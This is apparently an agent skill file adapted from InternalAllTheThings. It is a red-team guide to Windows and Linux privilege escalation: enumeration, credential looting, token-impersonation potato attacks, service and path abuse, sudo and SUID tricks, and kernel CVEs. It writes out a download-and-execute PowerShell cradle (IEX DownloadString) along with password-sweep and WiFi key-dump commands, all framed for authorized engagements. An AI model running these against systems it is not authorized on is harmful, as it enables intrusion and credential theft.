---
name: redteam-privilege-escalation
description: >-
  Escalate privileges on compromised Windows and Linux hosts: enumeration checklists, service and
  scheduled-task abuse, unquoted service paths, kernel and driver exploits, impersonation
  privileges, SUID/capabilities/sudo/GTFOBins, NFS root squashing and local credential looting.
  Use after obtaining a low-privileged shell, when you need local admin or SYSTEM/root, or when
  triaging a host for escalation paths.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "6"
  generated-by: build/build.py
---

# Host Privilege Escalation (Windows and Linux)

Escalation is always one of four things: you can write something a higher-privileged principal will
execute (service binary, scheduled task, installer, cron job, library), you hold a token or privilege
that can be impersonated (`SeImpersonate`, `SeDebug`, a saved credential), a patch gap gives you a
kernel primitive, or a group membership hands you the host (Docker, LXD, NFS `no_root_squash`).
Done means `NT AUTHORITY\SYSTEM` / local admin or `uid=0` on the host, plus a note of which boundary
was crossed so the same check is not repeated on the next host.

## When to use this skill

- You have a low-privileged shell or beacon on a Windows or Linux host and need local admin,
  SYSTEM or root.
- You are triaging a host you already administer on paper, and need to enumerate which escalation
  path is actually present before spending time on exploits.
- You found credentials, a service ACL, or an unquoted path and need the exact abuse command.
- Escalation is host-local. For domain-wide escalation from a host you already own use
  `active-directory-domain-escalation`, for the credential material that feeds it
  `active-directory-credentials`, and for keeping the new privilege `redteam-persistence`.

## First moves

1. **Run one enumeration tool, then read its findings rather than its noise.** PowerUp, Seatbelt and
   PrivescCheck overlap; one run is enough to branch:

   ```powershell
   powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
   Seatbelt.exe -group=all -full
   ```

2. **Turn the patch level into a shortlist before trying kernel exploits.** WES-NG maps `systeminfo`
   output to missing bulletins:

   ```powershell
   systeminfo > systeminfo.txt
   wmic qfe
   python3 wes.py --update-wes
   python3 wes.py systeminfo.txt
   ```

3. **Read your own token first.** The privilege list, not the group list, decides the potato and
   impersonation branch:

   ```powershell
   whoami /priv
   whoami /groups
   ```

4. **Check service ACLs and unquoted paths together** — both are exploitable only if you can write
   to the binary path or its parent directory:

   ```powershell
   accesschk.exe -uwcqv "Authenticated Users" * /accepteula
   gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
   ```

5. **Loot credentials before exploiting anything.** Files, registry and shell history frequently
   contain a working admin password, which is cheaper and quieter than a kernel exploit:

   ```powershell
   findstr /si password *.xml *.ini *.txt *.config
   reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
   netsh wlan show profile <SSID> key=clear
   ```

6. **On Linux, run the same branch logic in one pass** — sudo rights, capabilities and SUID are the
   three highest-yield checks:

   ```bash
   ./linpeas.sh -a
   sudo -l
   getcap -r /usr/bin
   find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
   ```

## Reference map

Read these in order: enumeration gives you the branch, credential looting is the cheapest win, then
local EoP, impersonation/privileged files, CVEs, and Linux last.

| Reference | Read it when | Key content |
|---|---|---|
| [windows-privesc-enumeration.md](references/windows-privesc-enumeration.md) | you just landed and need the host profile | PowerUp/winPEAS/Seatbelt/WES-NG/PrivescCheck, OS build and patch level, user/group/network/AV enumeration, default writable folders |
| [windows-privesc-credential-looting.md](references/windows-privesc-credential-looting.md) | you want an existing password instead of an exploit | SAM/SYSTEM hives, HiveNightmare (CVE-2021-36934), LAPS settings, `findstr`/registry sweeps, unattend.xml, IIS `web.config`, WiFi and Sticky Notes, PSReadLine history and transcripts, UWP `PasswordVault`, ADS |
| [windows-privesc-local-eop.md](references/windows-privesc-local-eop.md) | a service, path, installer or driver looks writable | process/task enumeration, weak service permissions and DLL hijacking, WSL, unquoted service paths, `$PATH` interception, named pipes, kernel exploits, AlwaysInstallElevated and MSI CustomActions, GUI apps, vulnerable drivers, printers, `runas /savecred`, shadow copies |
| [windows-privesc-privileges.md](references/windows-privesc-privileges.md) | `whoami /priv` shows an interesting privilege, or you are already local admin | admin→SYSTEM (`PsExec -s`), LOLBAS, the privilege→impact table (`SeImpersonate`, `SeBackup`, `SeDebug`, `SeLoadDriver`, `SeTakeOwnership`, `SeRestore`, `SeTcb`), FullPowers, potato family (Rotten/Juicy/Rogue/EFS/JuicyPotatoNG/PrintSpoofer), DiagHub/UsoDLLLoader/WerTrigger/WerMgr privileged writes, privileged file delete via MSI rollback |
| [windows-privesc-cves.md](references/windows-privesc-cves.md) | the patch shortlist names a specific bulletin | MS08-067, MS10-015, MS11-080, MS15-051, MS16-032, MS17-010 detection and exploit paths, CVE-2019-1388 scope |
| [linux-privesc.md](references/linux-privesc.md) | the host is Linux | linpeas/LSE/LinEnum, password looting and preseed files, SSH keys and Debian weak keys, cron and systemd timers, SUID, capabilities, sudo NOPASSWD/LD_PRELOAD/doas/sudo_inject/CVE-2019-14287, GTFOBins, tar wildcards, writable `/etc/passwd` and `/etc/sudoers`, NFS `no_root_squash`, ldconfig/RPATH, Docker/LXD groups, tmux hijack, kernel CVEs |

## Workflow

1. **Enumerate once, decide by evidence.** Windows: build, patches, AV, privileges, services, tasks,
   writable directories. Linux: kernel, sudo, SUID, capabilities, cron/systemd, groups. The output of
   this step selects every later step.
2. **Cheapest branch first: credential looting.** A password in `unattend.xml`, a service account in
   a registry key, or a WiFi PSK may end the task. Only move on when looting is dry.
3. **Privilege branch (Windows service accounts).** `SeImpersonate`/`SeAssignPrimaryToken` →
   potato family. Choose by build: below Windows 10 1809 / Server 2019 use JuicyPotato with a
   version-matched CLSID; at or above use RoguePotato, JuicyPotatoNG or PrintSpoofer. `SeDebug` →
   duplicate an `lsass.exe` token. `SeBackup`/`SeRestore`/`SeTakeOwnership` → replace a system binary
   or read protected files. `SeLoadDriver` → load a vulnerable signed driver.
4. **Misconfiguration branch.** Weak service permissions or unquoted paths → replace the binary.
   `AlwaysInstallElevated` in both hives → MSI payload. MSI CustomActions → `msiexec /fa` repair.
   WSL present → `--default-user root`. Insecure GUI app running as SYSTEM → spawn a shell from it.
5. **Patch branch.** Only after 1-3 fail: match the exact build against
   `windows-privesc-cves.md`; MS16-032 and MS17-010 are the common survivors on old estates.
6. **Local admin → SYSTEM.** `PsExec.exe -i -s cmd.exe`, or steal a SYSTEM token from a service
   process. Do this before attempting domain actions from the host.
7. **Linux branch.** `sudo -l` NOPASSWD → GTFOBins escape. SUID/capabilities → `cap_setuid+ep` or
   `cap_dac_read_search`. Writable cron/systemd unit → wait for the timer. Group membership →
   Docker/LXD mount of the host filesystem. NFS `no_root_squash` → SUID binary on the share.
   Kernel CVE last.

## Gotchas

- DiagHub DLL loading stops working from Windows 10 1903; UsoDLLLoader no longer works on recent
  Insider builds; WerTrigger and WerMgr need a privileged file-write or directory-create primitive
  first. Check the version note in the reference before building the chain.
- JuicyPotato needs a CLSID that exists on that exact build — a wrong CLSID prints an auth failure
  and never yields SYSTEM. On 1809+ the DCOM path is closed; use RoguePotato/PrintSpoofer instead.
  PrintSpoofer requires `SeImpersonatePrivilege` to be enabled, not merely present.
- `AlwaysInstallElevated` is only exploitable when **both** the HKCU and HKLM values are `0x1`.
- `sc config` syntax is whitespace-sensitive (`binpath= "..."` with a space after `=`); on XP the
  `upnphost` chain additionally needs `obj=`, `password=` and `depend=` reset.
- `SeBackupPrivilege` with `robocopy /b` needs `SeRestore` as well, and still cannot read files that
  are held open — it is not a universal file-read primitive.
- HiveNightmare is silent when patched: confirm with `icacls config\SAM` that `BUILTIN\Users` really
  has `(RX)` before spending time on shadow copies.
- Skeleton-key and LAPS tricks need domain-admin context; the LAPS "set expiration in the future"
  trick (`ms-mcs-admpwdexpirationtime`) is persistence, not escalation, and belongs to
  `redteam-persistence`.
- Linux: `sudo -u#-1` only works with a `(ALL, !root) ALL` sudoers entry (CVE-2019-14287). `doas`
  has its own config at `/etc/doas.conf`. Wildcard abuse needs the root-run command to expand `*`
  (e.g. `tar cf archive.tar *`) — verify before planting files.
- A `setuid` shell on an NFS share only works when the export has `no_root_squash`; otherwise the
  copied binary runs as `nobody`.
- Credentials often sit in places the enumeration tools do not print: PowerShell transcripts
  (`C:\Transcripts`), `ConsoleHost_history.txt`, and alternate data streams
  (`Get-Item -Stream *`).

## Authorized use

For authorized engagements only, with explicit permission and within the agreed scope. Kernel
exploits and driver loading can crash the host — confirm the target's tolerance before running them.

## Source

Converted from the upstream InternalAllTheThings guides
(https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
